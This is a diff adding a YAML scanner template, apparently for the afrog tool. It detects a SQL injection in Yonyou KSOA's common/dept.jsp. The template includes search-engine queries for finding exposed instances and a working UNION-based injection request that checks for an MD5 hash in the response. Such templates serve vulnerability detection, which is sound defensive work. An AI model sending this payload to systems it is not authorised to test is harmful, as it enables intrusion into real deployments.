@@ -1,0 +1,22 @@
+id: yonyou-ksoa-dept-sqli
+
+info:
+  name: 用友时空 KSOA common/dept.jsp SQL 注入漏洞
+  author: zan8in
+  severity: high
+  verified: true
+  description: |-
+    Fofa: app="用友-时空KSOA"
+    ZoomEye: app:"用友时空KSOA"
+  reference:
+    - https://mp.weixin.qq.com/s/I6aG2vFIi5nbVZfuVNpyDw
+  tags: yonyou,ksoa,sqli
+  created: 2023/12/09
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /common/dept.jsp?deptid=1' UNION ALL SELECT 60%2Csys.fn_sqlvarbasetostr(HASHBYTES('MD5'%2C'12345'))--+
+    expression: response.status == 200 && response.body.bcontains(b'0x827ccb0eea8a706') 
+expression: r0()
